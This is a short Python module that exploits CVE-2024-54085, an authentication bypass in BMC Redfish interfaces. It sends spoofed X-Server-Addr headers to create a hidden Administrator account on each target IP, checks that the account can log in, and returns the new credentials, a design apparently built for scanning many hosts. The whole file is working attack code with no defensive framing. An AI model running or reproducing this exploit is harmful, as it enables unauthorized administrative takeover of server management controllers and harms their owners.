"""
CVE-2024-54085 auth bypass. Mirrors mcve1.txt:
  POST /redfish/v1/AccountService/Accounts with a spoofed X-Server-Addr header,
  create an admin account, then verify login via /redfish/v1/SessionService/Sessions.
"100% vulnerable" == account created AND login returns 201.
"""
import random, string
import aiohttp

BYPASS_HEADERS = [
    {"X-Server-Addr": "169.254.0.17:"},
    {"X-Server-Addr": "127.0.0.1:"},
    {"X-Server-Addr": "192.168.31.2:"},
]

def _rand(n):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

def _pass():
    chars = string.ascii_letters + string.digits
    pw = (random.choice(string.ascii_uppercase) + random.choice(string.ascii_lowercase)
          + random.choice(string.digits) + "!@" + "".join(random.choice(chars) for _ in range(8)))
    return "".join(random.sample(pw, len(pw)))

def _payload():
    return {"Name": "lan test", "Description": "lan test", "Enabled": True,
            "Password": "", "RoleId": "Administrator", "Locked": False,
            "PasswordChangeRequired": False,
            "UserName": _rand(8), "Password": _pass()}

async def _create(session, url, header, timeout):
    body = _payload()
    async with session.post(f"{url}/redfish/v1/AccountService/Accounts",
                            json=body, headers=header, ssl=False, timeout=timeout) as r:
        try:
            j = await r.json(content_type=None)
        except Exception:
            j = {}
        return body, r.status, (j or {})

async def _login(session, url, user, pw, timeout):
    try:
        async with session.post(f"{url}/redfish/v1/SessionService/Sessions",
                                json={"UserName": user, "Password": pw},
                                ssl=False, timeout=timeout) as r:
            return r.status == 201
    except Exception:
        return False

async def check_ip(session, ip, timeout=6, retries=1):
    url = f"https://{ip}"
    for header in BYPASS_HEADERS:
        for _ in range(retries + 1):
            try:
                body, status, j = await _create(session, url, header, timeout)
            except Exception:
                continue
            if j.get("UserName"):
                if await _login(session, url, j["UserName"], body["Password"], timeout):
                    return {"ip": ip, "vulnerable": True, "user": j["UserName"],
                            "pass": body["Password"], "bypass": header["X-Server-Addr"]}
    return {"ip": ip, "vulnerable": False}
